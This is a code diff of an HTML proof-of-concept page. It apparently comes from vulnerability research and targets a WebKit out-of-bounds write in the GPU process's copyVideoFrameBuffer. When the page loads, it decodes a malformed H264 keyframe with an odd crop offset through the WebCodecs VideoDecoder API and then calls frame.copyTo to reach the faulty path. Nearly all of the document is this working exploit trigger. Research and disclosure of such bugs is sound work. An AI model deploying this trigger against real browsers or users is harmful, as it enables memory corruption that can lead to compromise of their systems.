@@ -3,52 +3,93 @@
 <head><title>dfe0d84a7b PoC</title></head>
 <body>
 <script>
-const H264_B64 = "AAAAAWdCwB7Gna0AAAABaM44gAAAAAFliIQAM/////g=";
-function b64ToUint8(b64) {
-    const bin = atob(b64);
-    const arr = new Uint8Array(bin.length);
-    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+// dfe0d84a7b: H264 frame_crop_right_offset=1 → odd visible_width
+// Target: WebKit copyVideoFrameBuffer OOB write in GPU process
+// Trigger: WebCodecs VideoDecoder API
+
+// Minimal H264: SPS(16x16 coded, frame_crop_right_offset=1), PPS, IDR
+// SPS encodes frame_crop_right_offset=1 without SubWidthC multiplication bug
+const H264_HEX = "000000016742c01ec69dad000000016cc4e200000001658884003ffffffe";
+
+function hexToBytes(hex) {
+    const arr = new Uint8Array(hex.length / 2);
+    for (let i = 0; i < arr.length; i++)
+        arr[i] = parseInt(hex.substr(i*2, 2), 16);
     return arr;
 }
+
 function post(msg) {
     console.log('[PoC] ' + msg);
-    try { window.webkit.messageHandlers.status.postMessage(msg); } catch(e) {}
+    try { window.webkit.messageHandlers.status.postMessage(String(msg)); } catch(e) {}
 }
-async function run() {
+
+async function runPoC() {
     post('START');
+
+    // Check WebCodecs availability
     if (typeof VideoDecoder === 'undefined') {
-        post('FAIL:NoWebCodecs'); return;
+        post('FAIL:NoWebCodecs');
+        return;
     }
+    post('INFO:WebCodecs available');
+
+    const h264Data = hexToBytes(H264_HEX);
+    post('INFO:H264 bytes=' + h264Data.length);
+
+    let outputCount = 0;
+
     const decoder = new VideoDecoder({
         output: (frame) => {
-            post('DECODED:w=' + frame.visibleRect.width + ' h=' + frame.visibleRect.height);
-            const dest = new Uint8Array(512);
+            outputCount++;
+            const w = frame.visibleRect ? frame.visibleRect.width : frame.codedWidth;
+            const h = frame.visibleRect ? frame.visibleRect.height : frame.codedHeight;
+            post('DECODED:' + outputCount + ':w=' + w + ':h=' + h);
+
+            // copyTo triggers the copyVideoFrameBuffer path
+            const bufSize = frame.allocationSize();
+            const dest = new ArrayBuffer(bufSize > 0 ? bufSize : 512);
             frame.copyTo(dest).then(() => {
                 frame.close();
-                post('COPYTO:OK');
+                post('COPYTO:OK:buf=' + dest.byteLength);
             }).catch(err => {
                 frame.close();
                 post('COPYTO_ERR:' + err.message);
             });
         },
-        error: (err) => { post('DECODE_ERR:' + err.message); }
+        error: (err) => {
+            post('DECODE_ERR:' + err.message);
+        }
     });
+
     try {
+        // Configure for H264 Baseline Level 3.0, 16x16
         await decoder.configure({
             codec: 'avc1.42001E',
             codedWidth: 16,
-            codedHeight: 16
+            codedHeight: 16,
+            hardwareAcceleration: 'prefer-hardware'
         });
+        post('INFO:Decoder configured');
+
+        // Submit the malformed keyframe
         decoder.decode(new EncodedVideoChunk({
-            type: 'key', timestamp: 0,
-            data: b64ToUint8(H264_B64)
+            type: 'key',
+            timestamp: 0,
+            duration: 33333,
+            data: h264Data
         }));
+        post('INFO:Chunk submitted');
+
         await decoder.flush();
-        post('FLUSH_DONE');
-    } catch(e) { post('ERR:' + e.message); }
-    setTimeout(() => post('DONE'), 3000);
+        post('FLUSH:done:outputs=' + outputCount);
+    } catch(e) {
+        post('ERR:' + e.message);
+    }
+
+    setTimeout(() => post('DONE'), 2000);
 }
-window.onload = run;
+
+window.addEventListener('load', runPoC);
 </script>
 </body>
 </html>
